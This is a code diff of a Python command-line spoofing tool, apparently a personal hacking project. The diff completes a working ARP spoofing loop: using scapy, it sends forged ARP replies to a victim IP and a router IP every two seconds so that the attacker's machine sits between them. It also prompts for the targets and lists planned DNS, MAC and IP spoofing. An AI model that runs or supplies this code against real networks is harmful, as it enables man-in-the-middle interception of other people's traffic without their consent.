@@ -5,8 +5,13 @@ import os
 from colorama import init, Fore, Back, Style
 import threading
 
-def installingReq():
+# TODO: Add DNS Spoofing
+# TODO: Add MAC Address Spoofing
+# TODO: Add IP Address Spoofing
+# TODO: Add background process to install requirements 
 
+def installingReq():
+    pass
 
 class loadingScreens():
     def __init__(self, choice):
@@ -41,20 +46,23 @@ class ARP_SPOOFING:
         self.sentPacketCount = 0
 
         while True:
-
-            self.sentPacketCount = self.sentPacketCount + 2
+            self.sentPacketCount += 2
+            self.arpSpoof(vicIp, routIP)
+            self.arpSpoof(routIP, vicIp)
             print("\r[+] Packets sent: " + str(self.sentPacketCount), end="")
+            sys.stdout.flush()
+            time.sleep(2)
 
     def askInput(self):
-        victim_ip = input("Victim IP Address: ")
-        router_ip = input("Router IP Address: ")
-
+        victim_ip = input("[Victim IP Address]>>> ")
+        print("\r")
+        router_ip = input("[Router IP Address]>>> ")
+        print("\r")
         return victim_ip, router_ip
     
-    def arpSpoof(self, target_ip, spoof_ip):
-        arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.getMac(target_ip), psrc=spoof_ip) # making an ARP packet, psrc = source ip, pdst = destination ip, hwdst = destination mac
+    def arpSpoof(self, targetIp, spoofIP):
+        arp_packet = scapy.ARP(op=2, pdst=targetIp, hwdst=self.getMac(targetIp), psrc=spoofIP) # making an ARP packet, psrc = source ip, pdst = destination ip, hwdst = destination mac
         scapy.send(arp_packet)
-
 
 
     def getMac(self, ip):
@@ -92,12 +100,13 @@ def main():
           3. MAC Address Spoofing $(Coming Soon)
           4. IP Address Spoofing $(Coming Soon)
     \n\n""") 
-    choice = input(">>> ")
+    choice = input("spf>>> ")
     if(choice == "1"):
+        os.system("cls||clear")
+        banner()
         arpS = ARP_SPOOFING()
     elif (choice == "q" or choice == "Q" or choice == "quit" or choice == "QUIT"):
         exit()
-    # arp_request = scapy.ARP(pdst=ip)    
     
 if __name__ == "__main__":
    main() 
